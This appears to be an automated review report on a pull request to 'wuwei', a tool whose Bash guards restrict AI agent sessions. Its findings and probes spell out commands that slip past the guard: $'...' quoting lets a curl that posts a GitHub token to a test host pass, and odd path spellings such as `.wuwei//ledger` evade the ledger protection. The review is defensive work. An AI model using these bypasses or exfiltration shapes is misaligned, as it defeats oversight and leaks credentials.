Verdict: FIX
Gate: arch
Item: shell-doors
PR: taoq-ai/wuwei#1109
Head: 67b367ae51e6d4c111b50aa3b74d8df270130b1e
Confidence: high
Breaking: yes: Bash commands that passed on main are now refused for agent sessions: a door command behind process substitution or a glued separator meets its door; a command naming a door program with $'...' or $"..." quoting; a writer (rm, mv, cp, tee, dd, chmod, ln, shred, truncate, sed -i, python) or redirect naming .wuwei, .wuwei/, .wuwei/ledger or .wuwei/ledger.jsonl, also after =, including read-only shapes such as cp file dir/.wuwei/, cp -r .wuwei /tmp/bk and python3 script.py <path>/.wuwei; a multi-line command naming bare .wuwei; and an edit of those paths

## Findings
- [high] cli/wuwei/guards.py:86 blocks: yes. Failure: a `$'...'` or `$"..."` span anywhere in a command makes segments() return None, and bash() then skips every per-segment door when the text names no DOOR_WORDS entry. The leak door and the infrastructure ask are lost: `curl -d ghp_<36 chars> https://e.test $'x'`, `echo $'\n'; curl -d ghp_<36 chars> https://e.test` and `terraform apply $'x'` pass at head, while main refuses the first two and asks on the third. `curl -H $'Authorization: token ghp_...'` is a natural shape for an agent to write. This regresses the Secrets door that docs/site/concepts/doors.md publishes, and neither the Breaking section nor SECURITY.md records it. A fix: keep the segments and mark them unread (for example return [UNREAD] + out), so the door-word refusal applies and the loop still runs the leak, infra and ledger checks.
- [medium] SECURITY.md:33 blocks: yes. Failure: the new paragraph saying what the guards now read sits in the middle of the list "Known shapes they do not read on one line". The three gaps after it (function bodies, coproc and backticks; shell options before -c; unlisted wrappers) now read as if they continued the "now read" text. A reader of the published security policy can take them as covered. Move the paragraph after the list, or before the list's intro.
- [low] blocks: no. The OPS split replacing the promise's "refuse as unreadable" is sound. Refusing a punctuation-only word falsely refuses `x=$(gh pr view 5 --json state); echo $x` and breaks the #1038 test and acceptance 4. Every character in ();<>|& is an sh operator, so a maximal-munch split only ever adds segments. It is two-way (revert). The decision is recorded in spec Clarifications, analysis I1 and the PR body, but not under the spec's Assumptions:, and the plan item's promise text still says unreadable. The planner should reword the promise so plan and code agree.
- [low] blocks: no. The Breaking section and migration name the three read-only moves asked about (a multi-line python naming bare .wuwei, python3 script.py .../.wuwei, cp file dir/.wuwei/). The writer bullet also covers copy-out shapes, `cp -r .wuwei /tmp/bk` and `python3 -m pytest .wuwei`, both refused at head, but the migration explains only copying into a tree. A line on copying out (tar, rsync or name the files) would help.
- [low] cli/wuwei/guards.py:303 blocks: no. The multi-line refusal's reason still lists `.wuwei/ledger` as the door word. A seat refused for `cd /repo/.wuwei && python3 -c "..."` over several lines is told about a ledger it never named.
- [low] blocks: no. `rm -rf .wuwei//ledger` and `rm -rf .wuwei/./ledger` pass at head. These are path spellings outside acceptance and are not listed in SECURITY.md's known gaps beside the glob and cd cases.
- [low] blocks: no. Runtime is 2,999 of 3,000, and the plan holds no open free-lines item. The next item that adds a runtime line must start by freeing lines. segments() line 88 is already a dense one-liner, and the high finding's fix has to stay line-neutral.

## Probes
- The suite at 67b367a in a git archive copy: pytest -q gave 1103 passed, 2 skipped. cli/wuwei and .claude/wuwei/cli/wuwei are identical (diff -r). Runtime is 2,999 lines (cat cli/wuwei/*.py | wc -l).
- A stub git on PATH under bash -c logged `push origin main` for every acceptance shape except echo >(...). That one ran asynchronously and logged nothing in my run, because bash exits before the substitution finishes. Also logged: `true |& ...`, `case ... ;& ...` and `echo $((1+2)) && ...`. guards.bash at head refuses all of them.
- Every traced Bash command in .wuwei/traces.jsonl (2,356 unique) was read by guards.bash at 83f1f09 and at head with git stubbed out. 6 move, all from pass to deny. 3 are artifacts of traces truncated at 200 characters (shlex: No closing quotation, plus the new bare .wuwei door word). The real moves are the spec's 3: two multi-line python commands naming .wuwei and `python3 -I rows.py /home/user/wuwei/.wuwei`.
- A grep of charters/, skills/, agents/ and hooks/ for .wuwei used as a writer argument, redirect target or bare word found no seat route newly refused. setup.py's harness deny rules (Edit/Write .wuwei/ledger.jsonl and ledger/**) need no change.
- The leak and infra probe in lcmds.txt gave the high finding's results: head passes all three `$'` shapes, main refuses or asks on each.
- origin/main moved to a7fe6d5 (release 2.0.0, version files and CHANGELOG only). git merge-tree reports a clean merge.
- Confidence is high: the regression reproduces from guards.bash on both trees, and the docs finding is visible in the file text.

## Residual risk
Ledger path spellings (//, /./, globs) and cwd tracking stay open, and the line budget leaves no room for the fix without a trade.
